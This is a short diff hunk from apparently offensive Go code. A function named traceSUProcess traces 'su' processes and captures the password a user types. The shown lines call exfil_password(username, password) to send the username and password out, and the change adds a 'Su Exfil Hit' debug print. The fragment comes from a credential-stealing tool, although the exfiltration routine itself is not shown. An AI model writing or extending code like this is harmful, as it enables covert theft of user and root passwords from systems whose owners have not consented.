@@ -61,6 +61,7 @@ func traceSUProcess(pid int) {
 						}
 						return true
 					}(password) {
+						fmt.Print("Su Exfil Hit")
 						go exfil_password(username, password)
 					}
 				}
